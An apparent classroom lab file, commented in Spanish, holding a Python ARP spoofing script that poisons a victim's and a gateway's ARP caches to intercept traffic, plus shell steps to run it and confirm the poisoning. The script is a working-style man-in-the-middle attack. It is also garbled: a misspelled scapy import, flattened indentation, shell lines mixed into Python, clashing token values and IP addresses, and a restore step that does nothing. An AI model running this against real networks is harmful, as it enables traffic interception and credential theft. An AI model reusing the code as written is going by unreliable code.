#!/usr/bin/env python3
# arp_spoof.py — Script educativo de ARP Spoofing
# Autor del laboratorio: Grupo 10
# TOKEN: 13330
from sayal import Ether, ARP, srp1, sendp, get_if_hwaddr
import time, sys
TARGET_IP = '172.13.30.26' # IP de PC-Prod (víctima)
GATEWAY_IP = '10.13.30.2' # IP del gateway MikroTik VLAN 20
IFACE = 'eth0' # Interfaz del atacante en Kali

def get_mac(ip):
 """Obtiene la MAC real de una IP via ARP request legítimo"""
 ans = srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),
 timeout=2, iface=IFACE, verbose=False)
 return ans[ARP].hwsrc if ans else None

def spoof(target_ip, spoof_ip):
 """Envía ARP reply falso: 'yo soy spoof_ip' — sin haber recibido request"""
 attacker_mac = get_if_hwaddr(IFACE)
 # ARP op=2 = reply; psrc = IP que suplantamos; hwsrc = nuestra MAC
 pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / \
 ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwsrc=attacker_mac)
 sendp(pkt, iface=IFACE, verbose=False)

# Habilitar reenvío de paquetes para MITM transparente
import subprocess
subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True)

print(f'[TOKEN-1330] ARP Spoofing: {TARGET_IP} <-> {GATEWAY_IP}')
print('[*] Ctrl+C para detener')
sent = 0
try:
 while True:
 spoof(TARGET_IP, GATEWAY_IP) # A la víctima: 'yo soy el gateway'
 spoof(GATEWAY_IP, TARGET_IP) # Al gateway: 'yo soy la víctima'
 sent += 2
 print(f'\r[*] Paquetes ARP maliciosos: {sent}', end='')
 time.sleep(1.5)
except KeyboardInterrupt:
 print('\n[*] Ataque detenido — restaurando ARP...')
 sys.exit(0)

# Ejecutar el script
sudo python3 /tmp/arp_spoof.py

# En paralelo — Wireshark en la máquina atacante
# Filtro: arp || (ip.addr == 10.10.10.10 && http)
# Observe: (1) los paquetes ARP falsos enviados
# (2) el tráfico HTTP de la víctima pasando por el atacante
# En PC-Prod — verificar que el caché ARP fue envenenado
arp -a
# La MAC del gateway debe ser la MAC del atacante — eso confirma el MITM
